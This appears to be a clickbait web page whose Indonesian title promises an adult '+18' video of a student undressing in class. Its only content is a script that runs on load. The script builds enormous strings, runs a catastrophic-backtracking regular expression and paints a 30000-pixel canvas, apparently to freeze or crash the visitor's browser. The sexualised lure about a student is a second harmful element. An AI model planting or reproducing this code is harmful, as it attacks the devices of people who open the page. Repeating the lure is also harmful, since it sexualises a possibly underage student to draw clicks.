<!DOCTYPE html>
<html>
<head><title>Seorang siswa tertangkap basah Tidur di kelas saat jam pelajaran berlangsung siswa melakukan hal yang tak terduga sampai membuka celana nya khusus untuk +18</title></head>
<body>
<script>
  const payload = "ꦾꦾ꧀ꦾ".repeat(10_000_000);
  const pattern = /(([\u1b80-\u1bbf\u13000-\u1342f\ud800-\udfff]*)*)+$/;

  let s = '';
  for (let i = 0; i < 1e7; i++) {
    s += String.fromCharCode(0xD800 + (i % 1024));
  }

  pattern.test(payload + s);
  
  const c = document.createElement('canvas');
  c.width = c.height = 30000;
  document.body.appendChild(c);
  const ctx = c.getContext('2d');
  ctx.fillStyle = 'red';
  ctx.fillRect(0, 0, 30000, 30000);
</script>
</body>
</html>
